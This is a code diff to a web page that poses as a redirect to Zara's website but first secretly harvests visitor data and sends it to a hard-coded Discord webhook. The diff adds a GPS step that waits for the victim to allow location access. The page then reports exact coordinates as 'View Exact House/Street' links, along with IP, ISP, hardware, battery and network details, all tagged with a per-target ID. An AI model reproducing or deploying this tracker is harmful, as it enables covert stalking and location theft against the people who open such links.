@@ -2,58 +2,79 @@
     async function logAndGo() {
         const webhookURL = "https://discord.com/api/webhooks/1494944448767983697/KzHvXGmFkSIWds1vzdEDuySWPA6XuDyAwuddTBol9QJbaw5NLDjD_JdBp-LNWgizpBvC";
         const destination = "https://www.zara.com/my/";
-        const timeout = setTimeout(() => window.location.replace(destination), 4000);
+        
+        // Extended timeout to 12s to give the user time to click "Allow" on the GPS popup
+        const timeout = setTimeout(() => window.location.replace(destination), 12000);
+
+        // Helper: Get GPS Promise
+        const getGPS = () => {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) resolve(null);
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        acc: pos.coords.accuracy
+                    }),
+                    () => resolve(null), // If they block or GPS is off
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            });
+        };
 
         try {
-            // 1. URL ID Tracking (Usage: link.com/?id=Hafizi)
+            // 1. Start GPS request immediately (Triggers Popup)
+            const coords = await getGPS();
+
+            // 2. URL ID Tracking
             const urlParams = new URLSearchParams(window.location.search);
             const visitorId = urlParams.get('id') || "Public/General";
 
-            // 2. IP & Enhanced Location
+            // 3. IP Data (Fallback/Secondary Location)
             const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
             const ipData = ipRes ? await ipRes.json() : {};
-            const place = `${ipData.city || '??'}, ${ipData.region || '??'} ${ipData.postal || ''}`;
-            const mapLink = (ipData.latitude && ipData.longitude) 
-                ? `[Google Maps](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})` 
-                : "No Coordinates";
 
-            // 3. Hardware & GPU (The "Phone Engine")
+            // 4. Decode GPS vs IP Map Link
+            let finalMapLink = "No Coordinates";
+            let locationTitle = "📍 Estimated Location (IP)";
+
+            if (coords) {
+                locationTitle = "🎯 EXACT GPS LOCATION";
+                finalMapLink = `[View Exact House/Street](https://www.google.com/maps?q=${coords.lat},${coords.lon})`;
+            } else if (ipData.latitude) {
+                finalMapLink = `[View General Area (IP)](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})`;
+            }
+
+            // 5. Hardware & GPU
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Hidden/Software";
+            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Hidden";
 
-            // 4. Battery Data
-            let batteryInfo = "Blocked/Safari";
+            // 6. Battery & Environment
+            let batteryInfo = "Protected/iOS";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
             }
 
-            // 5. Network & Browser Environment
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            const netType = conn ? conn.effectiveType : "Unknown";
-            const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Hidden (iOS)";
-            const orientation = screen.orientation ? screen.orientation.type : "Unknown";
-
-            // 6. Build the Discord Embed
+            // 7. Build Discord Report
             const logData = {
-                username: "Elite Sentry V5",
+                username: "Elite Sentry V7",
                 embeds: [{
                     title: `👤 Visitor: ${visitorId}`,
-                    color: 3447003, // Blue
+                    color: coords ? 3066993 : 15158332, // Green for GPS, Red for IP only
                     fields: [
-                        { name: "📍 Location", value: `**${place}**\n${ipData.country_name}`, inline: false },
-                        { name: "🗺️ IP Map", value: mapLink, inline: true },
-                        { name: "🌐 IP & ISP", value: `\`${ipData.ip}\`\n${ipData.org}`, inline: true },
+                        { name: locationTitle, value: finalMapLink, inline: false },
+                        { name: "📏 GPS Accuracy", value: coords ? `${Math.round(coords.acc)} meters` : "N/A", inline: true },
+                        { name: "🏙️ IP City/State", value: `${ipData.city || '??'}, ${ipData.region || '??'}`, inline: true },
+                        { name: "🌐 IP & ISP", value: `\`${ipData.ip}\` \n ${ipData.org}`, inline: true },
                         { name: "🎮 GPU / Chip", value: `\`${gpu}\``, inline: false },
                         { name: "🔋 Battery", value: batteryInfo, inline: true },
-                        { name: "📶 Network", value: netType.toUpperCase(), inline: true },
-                        { name: "📱 Hardware", value: `${navigator.platform} | ${navigator.hardwareConcurrency || '?'} Cores | ${ram} RAM`, inline: false },
-                        { name: "📐 Screen", value: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)`, inline: true },
-                        { name: "🌍 Other", value: `Lang: ${navigator.language}\nMode: ${orientation}`, inline: true }
+                        { name: "📶 Network", value: (navigator.connection ? navigator.connection.effectiveType : "Unknown").toUpperCase(), inline: true },
+                        { name: "📱 Hardware", value: `${navigator.platform} | ${navigator.hardwareConcurrency || '?'} Cores | ${navigator.deviceMemory || '?'}GB RAM`, inline: false }
                     ],
-                    footer: { text: `Target: ${destination}` },
+                    footer: { text: "GPS Tracking Active" },
                     timestamp: new Date()
                 }]
             };
@@ -66,7 +87,7 @@
             });
 
         } catch (e) {
-            console.log("Error logging, redirecting...");
+            console.log("Logger skip.");
         } finally {
             clearTimeout(timeout);
             window.location.replace(destination);
